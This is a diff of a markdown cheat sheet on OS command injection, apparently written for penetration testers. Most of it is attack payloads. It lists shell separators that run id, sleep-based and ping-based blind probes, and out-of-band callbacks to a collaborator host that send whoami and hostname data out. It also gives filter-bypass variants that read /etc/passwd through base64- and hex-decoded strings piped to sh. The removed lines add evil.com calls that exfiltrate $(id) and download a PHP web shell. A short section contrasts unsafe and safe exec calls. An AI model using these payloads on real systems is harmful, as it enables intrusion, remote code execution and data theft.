@@ -1,97 +1,129 @@
-# Command Injection: OS Command Execution
+# Command Injection: Complete Reference
 
-## Injection Points
+## Detection
 
-### Parameter-Based
+### Basic OS Command Injection
 ```bash
-# Shell metacharacters in any parameter passed to:
-# ping, nslookup, dig, curl, wget, whois, mail, convert
-ping 127.0.0.1; id
-nslookup target.com || id
-curl http://internal/$(whoami)
+# Linux
+; id
+| id
+`id`
+$(id)
+|| id
+&& id
+
+# Windows
+| dir
+|| dir
+& dir
+&& dir
 ```
 
-### Header-Based
-```http
-User-Agent: () { :;}; echo "vulnerable"  # Shellshock
-X-Forwarded-For: 127.0.0.1`id`
-Referer: https://target.com/|id|
-```
-
-### Filename-Based
+### Time-Based Detection
 ```bash
-# Upload file named: $(curl evil.com/$(id)).txt
-# Server processes filename in shell command
-```
-
-## Blind Command Injection
-
-### Time-Based
-```bash
+# Linux
 | sleep 5
-; ping -c 10 127.0.0.1
-`timeout 5`
+|| sleep 10
+$(sleep 5)
+`sleep 5`
+
+# Windows
+| ping -n 5 127.0.0.1
+|| timeout 5
 ```
 
-### OOB (DNS/HTTP)
+### Out-of-Band Detection
 ```bash
-| nslookup $(whoami).collaborator.oastify.com
-; curl http://collaborator.oastify.com/$(hostname)
-`wget --post-data="user=$(whoami)" http://collaborator.oastify.com/`
+# DNS/HTTP callback
+| curl http://COLLABORATOR.oastify.com
+|| nslookup COLLABORATOR.oastify.com
+$(wget http://COLLABORATOR.oastify.com)
 ```
 
-### Output Redirection
+## Exploitation
+
+### Bypass Techniques
+
+#### Space Filter Bypass
 ```bash
-# Write output to web-accessible file
-|| whoami > /var/www/html/output.txt ||
-# Then fetch: GET /output.txt
+# Tabs instead of spaces
+cat%09/etc/passwd
+
+# IFS (Internal Field Separator)
+cat${IFS}/etc/passwd
+
+# Brace expansion
+{cat,/etc/passwd}
 ```
 
-## WAF Bypass
-
-### Command Obfuscation
+#### Keyword Filter Bypass
 ```bash
-# Globbing
-cat /e??/p????d  # Expands to /etc/passwd
-# Variable injection
-cat /e${FOO:-c}/pa${BAR:-sswd}
+# Quoting
+c''at /etc/p''asswd
+c""at /etc/p""asswd
+c\at /etc/p\asswd
+
+# Base64 encoding
+echo 'Y2F0IC9ldGMvcGFzc3dk' | base64 -d | sh
+
 # Hex encoding
-$'cat' /etc/passwd
-# Base64 + eval
-echo "Y2F0IC9ldGMvcGFzc3dk" | base64 -d | sh
+echo '636174202f6574632f706173737764' | xxd -r -p | sh
+
+# Case variation
+CaT /eTc/PaSsWd
 ```
 
-### Argument Injection
-Some commands are vulnerable to argument injection (not shell injection):
+#### Character Filter Bypass
 ```bash
-# curl argument injection
-curl -o /tmp/shell.php http://evil.com/shell.txt
-# Not metacharacters but flags that the application passes to the command
+# $() for char generation
+$(printf "\x63\x61\x74") /etc/passwd
+
+# Wildcard
+/???/c?t /???/p?ss??
+
+# Environment variable manipulation
+$SHELL
+$PATH
 ```
 
-### WorstFit (Windows ANSI)
-```bash
-# Orange Tsai's WorstFit technique (CVE-2025-21204)
-# Unicode characters that normalize to dangerous ASCII in Windows ANSI
-# a with ring → a → can bypass filters
+## Frameworks
+
+### Node.js
+```javascript
+// Unsafe exec
+require('child_process').exec('ls ' + input, callback)
+
+// Safe: execFile
+require('child_process').execFile('ls', ['-la'], callback)
 ```
 
-## No Argument Context Injection
+### Python
+```python
+# Unsafe
+os.system(f"ls {input}")
+subprocess.call(f"ls {input}", shell=True)
 
-When user input is in the middle of a command with no separator:
-```bash
-# Original: finger $user@internal.com
-# Payload: $(id)@internal.com
-finger $(id)@internal.com
-# If the shell evaluates $() before the command runs, injection fires
+# Safe
+subprocess.call(["ls", input])
 ```
 
-## Automation
+### PHP
+```php
+// Unsafe
+system($input);
+exec($input);
+shell_exec($input);
+passthru($input);
+popen($input, "r");
 
-```bash
-# Commix for automated exploitation
-commix --url="https://target.com/page?cmd=test" --os-cmd="id"
-# Manual confirmation
-curl "https://target.com/ping?host=127.0.0.1%3Bid" -w "
-"
+// Safe
+escapeshellcmd($input);  // Still risky
+escapeshellarg($input);  // Better
 ```
+
+## CVSS Scoring
+| Scenario | CVSS | Criteria |
+|----------|------|---------|
+| OS command injection -> RCE | 9.8 | Network, Low, No auth, Full impact |
+| Blind command injection (time-based) | 7.5 | Network, Low, No auth, Changed scope |
+| Command injection with filter bypass | 9.1 | Network, Low, No auth, Full impact |
